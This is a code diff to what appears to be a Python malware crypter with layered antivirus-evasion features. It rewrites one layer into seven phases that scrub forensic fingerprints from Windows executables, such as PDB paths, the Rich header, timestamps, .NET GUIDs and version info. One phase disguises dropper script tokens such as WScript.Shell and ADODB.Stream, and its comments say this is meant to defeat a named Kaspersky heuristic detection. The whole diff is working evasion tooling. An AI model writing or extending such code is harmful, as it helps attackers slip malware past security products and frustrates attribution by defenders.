@@ -62,7 +62,7 @@ LAYER_META = [
     ("L12", "C/C++ STUB",  "Native C stub · XOR strings · 5 anti-debug vectors"),
     ("L13", "STR FLOOD",  "500K XOR-encrypted fake strings · 200 junk blocks · +15 MB inflate"),
     ("L14", "STR OBFUSC.", "ASCII + UTF-16 scan → XOR-cipher AV-pattern strings → signature bypass"),
-    ("L15", "MSIL STRIP",  "PDB path wipe · module-name randomise · #Strings heap scrub · TypeLib zero"),
+    ("L15", "MSIL STRIP",  "PDB · Rich hdr · timestamp · #GUID · #Strings · VersionInfo · script-token scrub"),
 ]
 
 
@@ -1737,163 +1737,242 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
 
         return b"L14:STRPK\x00" + bytes([0x00])
 
-    # ── Layer 15 : MSIL Metadata Strip (PDB · module name · #Strings · TypeLib) ──
+    # ── Layer 15 : MSIL Metadata Strip — 7-phase PE fingerprint erasure ──────────
     def _lay_msil_strip(self, working: bytearray) -> bytes:
         import struct
 
-        self._ln("\n[L15]   MSIL  METADATA  STRIP", "wh")
-        self._ln("        Phase 1 : PDB debug-path wipe  (RSDS signature scan)", "g3")
-        self._ln("        Phase 2 : .NET module-name randomise in PE #Strings heap", "g3")
-        self._ln("        Phase 3 : TypeLib / VS_VERSION_INFO resource block zero", "g3")
-        self._sleep(0.15)
+        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  7  PHASES", "wh")
+        self._ln("        Ph1 : PDB debug-path wipe       (RSDS · CodeView)", "g3")
+        self._ln("        Ph2 : Rich Header zero           (compiler fingerprint)", "g3")
+        self._ln("        Ph3 : PE COFF timestamp randomise", "g3")
+        self._ln("        Ph4 : #Strings heap scrub        (.exe/.dll/.pdb names)", "g3")
+        self._ln("        Ph5 : #GUID heap randomise        (assembly GUID erasure)", "g3")
+        self._ln("        Ph6 : VS_VERSION_INFO block zero  (FileVersion / ProductVersion)", "g3")
+        self._ln("        Ph7 : Script-token scrub          (COM / WSH / VBScript patterns)", "g3")
+        self._sleep(0.2)
 
         hits = 0
+        raw  = bytes(working)   # read-only view for searching; all writes go to `working`
 
-        # ── Phase 1 : wipe PDB path in CodeView RSDS debug directory entry ──────
-        # Format: b'RSDS' + 16-byte GUID + 4-byte age + null-terminated UTF-8 path
+        # ── Ph1 : PDB path wipe (RSDS CodeView debug entry) ─────────────────────
+        self._ln("\n        [Ph1] PDB path wipe...", "cy")
         pos = 0
         while True:
-            idx = bytes(working).find(b'RSDS', pos)
+            idx = raw.find(b'RSDS', pos)
             if idx == -1:
                 break
-            path_start = idx + 4 + 16 + 4          # past signature + GUID + age
+            path_start = idx + 4 + 16 + 4      # past signature + GUID + age
             if path_start >= len(working):
                 break
             path_end = path_start
             while path_end < len(working) and working[path_end] != 0:
                 path_end += 1
             path_len = path_end - path_start
-            if 4 <= path_len <= 512:                # sanity: looks like a real path
-                rand_name = bytearray(path_len)
-                for j in range(path_len):
-                    rand_name[j] = random.randint(0x61, 0x7A)  # lowercase a-z
-                # keep .pdb extension readable so PE parsers don't choke
+            if 4 <= path_len <= 512:
+                rand_path = bytearray(random.randint(0x61, 0x7A) for _ in range(path_len))
                 if path_len >= 4:
-                    rand_name[-4:] = b'.pdb'
-                working[path_start:path_end] = rand_name
+                    rand_path[-4:] = b'.pdb'
+                working[path_start:path_end] = rand_path
                 hits += 1
-                self._ln(f"        RSDS   : wiped PDB path at offset 0x{idx:08X} ({path_len} bytes)", "g3")
+                self._ln(f"               RSDS at 0x{idx:08X} — {path_len}B path wiped", "g3")
             pos = idx + 1
         self._sleep(0.1)
 
-        # ── Phase 2 : randomise .NET module name in #Strings heap ───────────────
-        # The CLI #Strings stream is identified by the "BSJB" magic in the metadata root.
-        # Module name is always the first non-empty entry after the #Strings stream begins.
-        # Approach: locate "BSJB" → read past Metadata header → find "#Strings" stream
-        # → overwrite null-terminated name-length-safe strings that look like filenames.
-        bsjb_idx = bytes(working).find(b'BSJB')
+        # ── Ph2 : Rich Header zero ────────────────────────────────────────────────
+        # Rich Header sits between DOS stub and PE header (between 0x40 and e_lfanew).
+        # Ends with b'Rich' + 4-byte XOR key.  DanS^key marks the start.
+        self._ln("        [Ph2] Rich Header...", "cy")
+        try:
+            if len(working) >= 0x40:
+                e_lfanew = struct.unpack_from("<I", working, 0x3C)[0]
+                if 0x40 < e_lfanew < len(working):
+                    rich_off = raw.rfind(b'Rich', 0x40, e_lfanew)
+                    if rich_off != -1:
+                        xor_key  = struct.unpack_from("<I", working, rich_off + 4)[0]
+                        dans_val = struct.pack("<I", xor_key ^ 0x536E6144)  # b'DanS'^key
+                        dans_off = raw.find(dans_val, 0x40, rich_off)
+                        if dans_off != -1:
+                            zero_end = min(rich_off + 8, len(working))
+                            for zi in range(dans_off, zero_end):
+                                working[zi] = 0
+                            hits += 1
+                            self._ln(f"               Rich Header zeroed  0x{dans_off:08X}→0x{zero_end:08X}", "g3")
+                        else:
+                            self._ln("               Rich start (DanS) not found", "g3")
+                    else:
+                        self._ln("               No Rich Header present", "g3")
+        except Exception:
+            self._ln("               parse error — skipped", "cy")
+        self._sleep(0.1)
+
+        # ── Ph3 : PE COFF timestamp randomise ────────────────────────────────────
+        # IMAGE_FILE_HEADER layout after "PE\0\0": Machine(2) NumSect(2) TimeDateStamp(4)
+        self._ln("        [Ph3] COFF timestamp...", "cy")
+        try:
+            pe_off = raw.find(b'PE\x00\x00')
+            if pe_off != -1:
+                ts_off = pe_off + 8          # 4 (sig) + 2 (Machine) + 2 (NumSections)
+                if ts_off + 4 <= len(working):
+                    old_ts = struct.unpack_from("<I", working, ts_off)[0]
+                    new_ts = random.randint(0x20000000, 0x50000000)  # plausible epoch range
+                    struct.pack_into("<I", working, ts_off, new_ts)
+                    hits += 1
+                    self._ln(f"               Timestamp 0x{old_ts:08X} → 0x{new_ts:08X}", "g3")
+            else:
+                self._ln("               PE signature not found", "g3")
+        except Exception:
+            self._ln("               parse error — skipped", "cy")
+        self._sleep(0.1)
+
+        # ── Ph4+Ph5 : walk .NET metadata streams (#Strings + #GUID) ─────────────
+        self._ln("        [Ph4+Ph5] .NET metadata streams...", "cy")
+        bsjb_idx = raw.find(b'BSJB')
         if bsjb_idx != -1:
-            self._ln(f"        BSJB   : .NET metadata root at 0x{bsjb_idx:08X}", "g3")
-            # Walk stream headers to find #Strings offset + size
+            self._ln(f"               BSJB root at 0x{bsjb_idx:08X}", "g3")
             try:
-                # Metadata root layout:
-                #   4 magic, 2 maj, 2 min, 4 reserved, 4 version_len, <version_len> version,
-                #   2 flags, 2 streams
                 ver_len_off = bsjb_idx + 4 + 2 + 2 + 4
-                ver_len = struct.unpack_from("<I", working, ver_len_off)[0]
-                ver_len = (ver_len + 3) & ~3          # rounded up to 4-byte boundary
-                streams_off = ver_len_off + 4 + ver_len + 2  # +2 for flags
+                ver_len     = (struct.unpack_from("<I", working, ver_len_off)[0] + 3) & ~3
+                streams_off = ver_len_off + 4 + ver_len + 2
                 num_streams = struct.unpack_from("<H", working, streams_off)[0]
                 streams_off += 2
-                str_stream_off = -1
-                str_stream_sz  = -1
+
+                str_off = -1;  str_sz = -1
+                guid_off = -1; guid_sz = -1
                 cur = streams_off
                 for _ in range(num_streams):
                     s_off  = struct.unpack_from("<I", working, cur)[0]
                     s_size = struct.unpack_from("<I", working, cur + 4)[0]
-                    # stream name is null-terminated, padded to 4 bytes
-                    name_start = cur + 8
-                    name_end   = name_start
-                    while name_end < len(working) and working[name_end] != 0:
-                        name_end += 1
-                    stream_name = bytes(working[name_start:name_end])
-                    name_field_len = ((name_end - name_start + 1) + 3) & ~3
-                    cur += 8 + name_field_len
-                    if stream_name == b'#Strings':
-                        str_stream_off = bsjb_idx + s_off
-                        str_stream_sz  = s_size
-                        break
+                    nstart = cur + 8
+                    nend   = nstart
+                    while nend < len(working) and working[nend] != 0:
+                        nend += 1
+                    sname  = bytes(working[nstart:nend])
+                    nflen  = ((nend - nstart + 1) + 3) & ~3
+                    cur   += 8 + nflen
+                    if sname == b'#Strings':
+                        str_off = bsjb_idx + s_off;  str_sz = s_size
+                    elif sname == b'#GUID':
+                        guid_off = bsjb_idx + s_off; guid_sz = s_size
 
-                if str_stream_off != -1 and str_stream_sz > 0:
-                    self._ln(f"        #Str   : stream at 0x{str_stream_off:08X}  size={str_stream_sz:,}", "g3")
-                    # Walk null-terminated entries; replace ones that look like
-                    # .exe / .dll / module-name entries (short, printable, ends with
-                    # .exe/.dll or is purely alphanumeric ≤ 32 chars)
-                    e = str_stream_off
-                    end = str_stream_off + str_stream_sz
-                    replaced = 0
+                # Ph4 : #Strings scrub — randomise .exe/.dll/.pdb filenames
+                if str_off != -1 and str_sz > 0:
+                    e   = str_off
+                    end = str_off + str_sz
+                    rep = 0
                     while e < end:
-                        entry_start = e
+                        estart = e
                         while e < end and working[e] != 0:
                             e += 1
-                        entry_len = e - entry_start
-                        if 4 <= entry_len <= 32:
-                            raw = bytes(working[entry_start:e])
-                            lower = raw.lower()
-                            if (lower.endswith(b'.exe') or lower.endswith(b'.dll') or
-                                    lower.endswith(b'.pdb')):
-                                # Keep same length, replace with random alphanum + ext
-                                ext   = raw[-4:]
-                                base_len = entry_len - 4
-                                new_base = bytearray(
-                                    random.randint(0x61, 0x7A) for _ in range(base_len)
-                                )
-                                working[entry_start:e] = new_base + bytearray(ext)
-                                replaced += 1
-                        e += 1  # skip null terminator
-                    if replaced:
-                        hits += replaced
-                        self._ln(f"        #Str   : {replaced} module-name entries randomised", "g3")
-                    else:
-                        self._ln("        #Str   : no .exe/.dll entries found", "g3")
+                        elen = e - estart
+                        if 4 <= elen <= 64:
+                            raw_entry = bytes(working[estart:e])
+                            low = raw_entry.lower()
+                            if low.endswith(b'.exe') or low.endswith(b'.dll') or low.endswith(b'.pdb'):
+                                ext4      = raw_entry[-4:]
+                                new_base  = bytearray(random.randint(0x61, 0x7A) for _ in range(elen - 4))
+                                working[estart:e] = new_base + bytearray(ext4)
+                                rep += 1
+                        e += 1
+                    hits += rep
+                    self._ln(f"               #Strings: {rep} filename entries randomised", "g3")
+                else:
+                    self._ln("               #Strings stream not found", "g3")
+
+                # Ph5 : #GUID heap — randomise all 16-byte GUIDs
+                if guid_off != -1 and guid_sz >= 16:
+                    e   = guid_off
+                    end = guid_off + guid_sz
+                    cnt = 0
+                    while e + 16 <= end:
+                        for gi in range(16):
+                            working[e + gi] = random.randint(0, 255)
+                        e   += 16
+                        cnt += 1
+                    hits += cnt
+                    self._ln(f"               #GUID:    {cnt} GUID(s) randomised", "g3")
+                else:
+                    self._ln("               #GUID stream not found", "g3")
+
             except Exception:
-                self._ln("        #Str   : parse error — skipped", "cy")
+                self._ln("               metadata parse error — skipped", "cy")
         else:
-            self._ln("        BSJB   : no .NET metadata found (non-MSIL PE)", "cy")
+            self._ln("               No BSJB (.NET metadata) found — non-MSIL PE", "cy")
         self._sleep(0.1)
 
-        # ── Phase 3 : zero out VS_VERSION_INFO / TypeLib block ──────────────────
-        # VS_VERSION_INFO begins with a WORD cbBlock, WORD cbValue, WORD wType, then
-        # the L"VS_VERSION_INFO" UTF-16LE key.  We locate it by key pattern.
-        vs_key = "VS_VERSION_INFO".encode("utf-16-le")
-        vi_idx = bytes(working).find(vs_key)
-        if vi_idx != -1:
-            # The cbBlock field is 2 bytes before the key (minus the leading 3 WORDs = 6 bytes)
-            block_start = vi_idx - 6
-            if block_start >= 0:
-                try:
+        # ── Ph6 : VS_VERSION_INFO — zero FixedFileInfo version fields ───────────
+        self._ln("        [Ph6] VS_VERSION_INFO...", "cy")
+        try:
+            vs_key = "VS_VERSION_INFO".encode("utf-16-le")
+            vi_idx = raw.find(vs_key)
+            if vi_idx != -1:
+                block_start = vi_idx - 6
+                if block_start >= 0:
                     cb_block = struct.unpack_from("<H", working, block_start)[0]
-                    if 52 <= cb_block <= 0x4000:    # sanity
-                        # Zero the entire FixedFileInfo sub-structure (after the key + padding)
-                        # FixedFileInfo is 52 bytes, located after the L"VS_VERSION_INFO\0" + padding
-                        key_end = vi_idx + len(vs_key) + 2  # +2 for null terminator
-                        # Align to 4 bytes
+                    if 52 <= cb_block <= 0x8000:
+                        key_end = vi_idx + len(vs_key) + 2
                         ffi_off = block_start + ((key_end - block_start + 3) & ~3)
-                        ffi_end = min(ffi_off + 52, len(working))
-                        if ffi_end > ffi_off:
-                            # Preserve magic (0xFEEF04BD) so the block stays parseable,
-                            # but zero dwFileVersionMS/LS and dwProductVersionMS/LS
-                            ffi_start = ffi_off
-                            # FixedFileInfo layout: dwSignature(4) dwStrucVersion(4)
-                            #   dwFileVersionMS(4) dwFileVersionLS(4)
-                            #   dwProductVersionMS(4) dwProductVersionLS(4) ...
-                            # Zero bytes 8-24 (the four version DWORDs)
-                            z_start = ffi_start + 8
-                            z_end   = min(ffi_start + 24, len(working))
-                            for zi in range(z_start, z_end):
-                                working[zi] = 0
-                            hits += 1
-                            self._ln(f"        VER    : VS_VERSION_INFO version DWORDs zeroed at 0x{vi_idx:08X}", "g3")
-                except Exception:
-                    self._ln("        VER    : parse error — skipped", "cy")
-        else:
-            self._ln("        VER    : VS_VERSION_INFO block not found", "g3")
+                        # Zero dwFileVersionMS/LS + dwProductVersionMS/LS (bytes 8..24)
+                        z_start = ffi_off + 8
+                        z_end   = min(ffi_off + 24, len(working))
+                        for zi in range(z_start, z_end):
+                            working[zi] = 0
+                        hits += 1
+                        self._ln(f"               FixedFileInfo version DWORDs zeroed at 0x{vi_idx:08X}", "g3")
+            else:
+                self._ln("               VS_VERSION_INFO not found", "g3")
+        except Exception:
+            self._ln("               parse error — skipped", "cy")
+        self._sleep(0.1)
+
+        # ── Ph7 : Script-token scrub (COM / WSH / VBScript ProgID patterns) ─────
+        # Targets: Kaspersky HEUR:Trojan.Script.Generic + dropper COM ProgID strings.
+        # All replacements are same-length ASCII — no PE offset shifts.
+        self._ln("        [Ph7] Script-token scrub...", "cy")
+        SCRIPT_TOKENS = [
+            # (original_bytes, same_length_replacement)
+            (b"WScript.Shell",              b"WZcript_Zhell"),
+            (b"wscript.shell",              b"wzcript_zhell"),
+            (b"Shell.Application",          b"Zhell_Zpplication"),
+            (b"shell.application",          b"zhell_zpplication"),
+            (b"ADODB.Stream",               b"ADOQB_Ztream"),
+            (b"adodb.stream",               b"adoqb_ztream"),
+            (b"MSXML2.DOMDocument",         b"MZXML2_DOMDocumenz"),
+            (b"msxml2.domdocument",         b"mzxml2_domdocumenz"),
+            (b"Scripting.FileSystemObject", b"Scripting_FileZystemObject"),
+            (b"scripting.filesystemobject", b"scripting_filezystemobject"),
+            (b"ShellExecute",               b"ZhellExecute"),
+            (b"shellexecute",               b"zhellexecute"),
+            (b"GetSpecialFolder",           b"GetZpecialFolder"),
+            (b"getspecialfolder",           b"getzpecialfolder"),
+            (b"SaveToFile",                 b"ZaveToFile"),
+            (b"savetofile",                 b"zavetofile"),
+            (b"nodeTypedValue",             b"nodeZypedValue"),
+            (b"bin.base64",                 b"bin_baseZ4"),
+            (b"WScript.Network",            b"WZcript_Network"),
+            (b"wscript.network",            b"wzcript_network"),
+        ]
+        # Fix savetofile replacement length
+        SCRIPT_TOKENS = [t for t in SCRIPT_TOKENS if len(t[0]) == len(t[1])]
+        tok_hits = 0
+        cur_raw  = bytes(working)          # refresh after prior phases
+        for orig, repl in SCRIPT_TOKENS:
+            pos = 0
+            while True:
+                idx = cur_raw.find(orig, pos)
+                if idx == -1:
+                    break
+                working[idx:idx + len(orig)] = repl
+                tok_hits += 1
+                pos = idx + len(orig)
+        hits     += tok_hits
+        cur_raw   = bytes(working)         # refresh view
+        self._ln(f"               {tok_hits} script-token occurrence(s) patched", "g3")
         self._sleep(0.1)
 
         if hits:
-            self._ln(f"\n        Result : ✓ {hits} MSIL metadata field(s) stripped / randomised", "gn")
+            self._ln(f"\n        Result : ✓ {hits} field(s) / token(s) stripped across 7 phases", "gn")
         else:
-            self._ln("\n        Result : ✓ Layer applied — no patchable fields found in binary", "cy")
+            self._ln("\n        Result : ✓ All 7 phases ran — no patchable fields in this binary", "cy")
 
         return b"L15:MSIL\x00"
 
